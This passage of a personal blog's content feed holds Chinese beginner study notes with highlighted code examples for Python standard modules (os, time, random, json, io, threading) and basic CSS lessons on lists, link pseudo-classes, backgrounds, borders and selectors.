<h2 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># #print(os.getcwd()) #</span></span><br><span class="line"><span class="comment"># os.chdir('D:')# 改变路径</span></span><br><span class="line"><span class="comment"># print(os.getcwd()) #获取当前路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#os.makedirs('China\\ChangSha') # 递归创建路径 存在 在创建会报错</span></span><br><span class="line"><span class="comment"># os.removedirs('China\\ChangSha') # 删除的目录只能是空的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#os.mkdir('China\\Changsha') # 单个文件夹创建</span></span><br><span class="line"><span class="comment">#os.rmdir('China') #单个文件夹删除</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(os.path.exists("China\\ChangSha")) #判断路径是否存在</span></span><br><span class="line"></span><br><span class="line">dirpath  = <span class="string">'Py\\doc'</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirpath):</span><br><span class="line">    os.makedirs(dirpath)</span><br><span class="line"></span><br><span class="line"><span class="comment">#os.path.join() 拼接路径</span></span><br><span class="line">res = os.path.join(os.getcwd(),<span class="string">'demo5'</span>)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></div>

<h2 id="time模块"><a href="#time模块" class="headerlink" title="time模块"></a>time模块</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># print('1111')</span></span><br><span class="line"><span class="comment"># time.sleep(2.0) # 延迟时间,强制等待</span></span><br><span class="line"><span class="comment"># print('23123')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(time.time()) # 秒时间戳</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(time.localtime()) #seconds --》()元组</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">2020-02-09</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#print(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime()))拼接时间格式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="comment"># print(datetime.datetime.now()) #当前时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(datetime.datetime.now()-datetime.timedelta(days=7)) 减七天</span></span><br></pre></td></tr></table></figure></div>

<h2 id="random模块"><a href="#random模块" class="headerlink" title="random模块"></a>random模块</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment"># print(random.random()) # [0-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(random.randint(1,10)) # [a,b]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(random.choice("123131")) # 从序列中随机选一个</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># li  = [1,2,3,4]</span></span><br><span class="line"><span class="comment"># tu = (1,2,3,4)</span></span><br><span class="line"><span class="comment"># random.shuffle(li) # 打乱序列</span></span><br><span class="line"><span class="comment"># print(li)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># li = [1,2,3,4]</span></span><br><span class="line"><span class="comment"># print(random.sample(li,2)) # 随机抽样</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1,3,5,7,9</span></span><br><span class="line"><span class="comment"># print(random.randrange(1,10,2)) #和range差不多</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">1、随机生成6位数验证码</span></span><br><span class="line"><span class="string">1-1. 使用随机数字</span></span><br><span class="line"><span class="string">1-2. 随机混合数字与字母</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">v_code</span><span class="params">()</span>:</span></span><br><span class="line">    code = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        li_range = [<span class="number">0</span>,<span class="string">'1'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>]</span><br><span class="line">        add_num = random.sample(li_range,<span class="number">2</span>) <span class="comment">#[]</span></span><br><span class="line">        add_num = map(str,add_num)</span><br><span class="line">        code += <span class="string">''</span>.join(add_num)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#num = random.randint(0,9)</span></span><br><span class="line">        <span class="comment">#print(num)</span></span><br><span class="line">        <span class="comment"># code += str(num)</span></span><br><span class="line">    print(code)</span><br><span class="line">v_code()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">A --&gt; ascii</span></span><br><span class="line"><span class="string">ord() 字符转ascii</span></span><br><span class="line"><span class="string">ch()  ascii转字符</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(ord('A'))</span></span><br><span class="line"><span class="comment"># print(chr(65))</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">v_code</span><span class="params">()</span>:</span></span><br><span class="line">    code = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        num = random.randrange(<span class="number">10</span>) <span class="comment">#[0~9]</span></span><br><span class="line">        char = chr(random.randrange(<span class="number">65</span>,<span class="number">91</span>)) <span class="comment"># [A-Z]</span></span><br><span class="line">        </span><br><span class="line">        add_num = random.choice([num,char])</span><br><span class="line">        code += str(add_num)</span><br><span class="line">    print(code)</span><br><span class="line">v_code()</span><br></pre></td></tr></table></figure></div>

<h2 id="Json模块"><a href="#Json模块" class="headerlink" title="Json模块"></a>Json模块</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment">#字典转json</span></span><br><span class="line"><span class="comment"># data = &#123;"name":"amy"&#125;  # dict --&gt;str</span></span><br><span class="line"><span class="comment"># print(type(data))</span></span><br><span class="line"><span class="comment"># # s = str(data)</span></span><br><span class="line"><span class="comment"># # print(s)</span></span><br><span class="line"><span class="comment"># res = json.dumps(data)  # dict --&gt; json</span></span><br><span class="line"><span class="comment"># print(res)  # '&#123;"name" : "amy"&#125;' Json格式</span></span><br><span class="line"><span class="comment"># print(type(res))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#json转字典</span></span><br><span class="line">j_data = <span class="string">'&#123;"name" : "amy"&#125;'</span>  <span class="comment"># json --&gt; dict  内部数据是双引号包裹</span></span><br><span class="line">print((json.loads(j_data))[<span class="string">'name'</span>])</span><br><span class="line">print(type(json.loads(j_data)))</span><br></pre></td></tr></table></figure></div>

<h2 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=io.StringIO()</span></span><br><span class="line"><span class="comment"># # print(type(s))</span></span><br><span class="line"><span class="comment"># s.write('this\nis\na\ngreat\nworld!')</span></span><br><span class="line"><span class="comment"># print(s.getvalue().strip()) #读取全部内容</span></span><br><span class="line"><span class="comment"># s.close()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># BytesIO</span></span><br><span class="line"><span class="comment"># b=io.BytesIO(b'a')</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># b.write('bbb'.encode(''))</span></span><br><span class="line"><span class="comment"># print(b.getvalue())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储图片 BytesIO</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">res = requests.get(<span class="string">'https://img.zcool.cn/community/0170cb554b9200000001bf723782e6.jpg@1280w_1l_2o_100sh.jpg'</span>)</span><br><span class="line">print(type(res.content))</span><br><span class="line">img=io.BytesIO(res.content)</span><br><span class="line">print(img.getvalue())</span><br></pre></td></tr></table></figure></div>

<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">'在%s,正在读书'</span> %time.ctime())</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        print(<span class="string">'在%s,正在写字'</span> %time.ctime())</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    t=threading.Thread(target=read).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    t=threading.Thread(target=write).start()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>python</tag>
        <tag>模块</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】CSS基础学习之列表和超链接伪类</title>
    <url>/posts/62.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="css背景超链接伪类和列表使用代码及注释"><a href="#css背景超链接伪类和列表使用代码及注释" class="headerlink" title="css背景超链接伪类和列表使用代码及注释"></a>css背景超链接伪类和列表使用代码及注释</h1><h2 id="demo4"><a href="#demo4" class="headerlink" title="demo4"></a>demo4</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo4<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--列表和超链接 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    	ul&#123;</span><br><span class="line"><span class="css">    		<span class="comment">/*list-style-type: decimal;*/</span> <span class="comment">/*upper-roman罗马字符 none无项目符号 square正方形 decimal数字*/</span></span></span><br><span class="line">    		/*list-style-image: url(1.jpg);</span><br><span class="line">    		*/</span><br><span class="line"></span><br><span class="line"><span class="css">    		<span class="comment">/*以上列表简写*/</span></span></span><br><span class="line"><span class="css">    		<span class="comment">/* list-style: outside decimal; */</span></span></span><br><span class="line">    		list-style: none;</span><br><span class="line">    		&#125;</span><br><span class="line"><span class="css">    		<span class="comment">/*去掉超链接标签的下划线*/</span></span></span><br><span class="line"><span class="css">    		<span class="selector-tag">a</span>&#123;<span class="attribute">text-decoration</span>: none;&#125;   </span></span><br><span class="line"></span><br><span class="line"><span class="css">    		<span class="comment">/*未访问颜色*/</span> </span></span><br><span class="line"><span class="css">    		<span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;</span></span><br><span class="line">    			color: red;</span><br><span class="line">    		&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    		<span class="comment">/*鼠标放上去的颜色*/</span> </span></span><br><span class="line"><span class="css">    		<span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line">    			color: navajowhite;</span><br><span class="line">    		&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    		<span class="comment">/*访问过的颜色*/</span> </span></span><br><span class="line"><span class="css">    		<span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>&#123;</span></span><br><span class="line">    			color: blue;</span><br><span class="line">    		&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    		<span class="comment">/*鼠标选中的颜色*/</span></span></span><br><span class="line"><span class="css">    		<span class="selector-tag">a</span><span class="selector-pseudo">:active</span>&#123;</span></span><br><span class="line"><span class="css">    			<span class="selector-tag">color</span>: <span class="selector-id">#000000</span>;</span></span><br><span class="line">    		&#125;</span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第一课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第二课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第三课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span>第四课<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第一课<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第二课<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第三课<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>第四课<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】CSS基础学习之背景边框文字文本的学习</title>
    <url>/posts/63.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="css背景文本框使用代码及注释"><a href="#css背景文本框使用代码及注释" class="headerlink" title="css背景文本框使用代码及注释"></a>css背景文本框使用代码及注释</h1><h2 id="demo3"><a href="#demo3" class="headerlink" title="demo3"></a>demo3</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo3<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--背景颜色 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    	body&#123;</span><br><span class="line">    		/*</span><br><span class="line"><span class="css">    		<span class="selector-tag">background-image</span>: <span class="selector-tag">url</span>(1<span class="selector-class">.jpg</span>);  图片背景</span></span><br><span class="line">    		background-repeat: no-repeat;  背景不重复</span><br><span class="line">    		background-size: 200px;        图片像素大小</span><br><span class="line">    		background-attachment: fixed;  图片固定于页面</span><br><span class="line">    		background-position: center top;  图片显示中间顶部</span><br><span class="line">    		*/</span><br><span class="line">    		</span><br><span class="line"><span class="css">    		<span class="comment">/*简写方式*/</span></span></span><br><span class="line">    		/*</span><br><span class="line"><span class="css">    		<span class="selector-tag">background</span>: <span class="selector-tag">url</span>(1<span class="selector-class">.jpg</span>) <span class="selector-tag">no-repeat</span> <span class="selector-tag">fixed</span> <span class="selector-tag">center</span> <span class="selector-tag">top</span>;</span></span><br><span class="line">    		*/</span><br><span class="line">    		font-family: "微软雅黑" arial;</span><br><span class="line">    		font-size: 22px;</span><br><span class="line"><span class="css">    		<span class="selector-tag">color</span>: <span class="selector-id">#808080</span>;</span></span><br><span class="line">    		font-weight: bold;</span><br><span class="line">    		font-variant: small-caps;</span><br><span class="line"></span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="comment">/*边框*/</span></span></span><br><span class="line"><span class="css">    	<span class="selector-class">.div1</span>&#123;</span></span><br><span class="line">    		width: 400px;</span><br><span class="line">    		height: 400px;</span><br><span class="line"></span><br><span class="line">    		/*</span><br><span class="line">    		border-width: 10px;</span><br><span class="line">    		border-color: red;  */</span><br><span class="line"><span class="css">    		<span class="comment">/*border-style: double ridge inset outset;   */</span></span></span><br><span class="line">    		</span><br><span class="line">    		border-left: solid;</span><br><span class="line">    		border-right: double;</span><br><span class="line">    		border-top: solid;</span><br><span class="line">    		border-bottom: double;</span><br><span class="line">    		text-align: center;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="selector-class">.div1</span> <span class="selector-tag">p</span>&#123;</span></span><br><span class="line">    		line-height: 30px;</span><br><span class="line">    		letter-spacing: 10px;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    	p&#123;</span><br><span class="line">    		text-indent: 20px;</span><br><span class="line">    		text-decoration: line-through;</span><br><span class="line"></span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--边框 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">		div1</span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			asdadadsadasdasdasd</span><br><span class="line">			asdadadsadasdasdasd</span><br><span class="line">			asdadadsadasdasdasd</span><br><span class="line">			asdadadsadasdasdasd</span><br><span class="line">			asdadadsadasdasdasd</span><br><span class="line">		<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>this is my heart<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>css</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】CSS基础学习之引用样式和选择器的使用</title>
    <url>/posts/55.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="css使用代码及注释"><a href="#css使用代码及注释" class="headerlink" title="css使用代码及注释"></a>css使用代码及注释</h1><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>框架<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--外部样式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"style.css"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"demo1"</span>&gt;</span></span><br><span class="line">		demo1</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--内联样式--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: red;"</span>&gt;</span>这是一个有趣的故事<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--引用样式--&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="style-css"><a href="#style-css" class="headerlink" title="style.css"></a>style.css</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@import</span> url(<span class="string">"css.css"</span>);</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.demo1</span>&#123;</span><br><span class="line">    	<span class="attribute">color</span>: blue;</span><br><span class="line">    	<span class="attribute">background</span>: red;</span><br><span class="line">    	<span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">    	<span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">        <span class="attribute">border</span>:  <span class="number">1px</span> solid black;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="css-css"><a href="#css-css" class="headerlink" title="css.css"></a>css.css</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="demo1-php"><a href="#demo1-php" class="headerlink" title="demo1.php"></a>demo1.php</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--通配符选择器、类选择器、元素选择器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    	*&#123;</span><br><span class="line">    		margin: 0px;</span><br><span class="line">    		padding: 0px;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="selector-class">.demo1</span>&#123;</span></span><br><span class="line">    		color: red;</span><br><span class="line">    		background: blue;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    	p&#123;</span><br><span class="line">    		color: red;</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    	<span class="selector-id">#demo2</span>&#123;</span></span><br><span class="line">    		color: grey;</span><br><span class="line">    	&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"demo1"</span>&gt;</span></span><br><span class="line">		demo1</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"demo2"</span>&gt;</span></span><br><span class="line">		demo2</span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

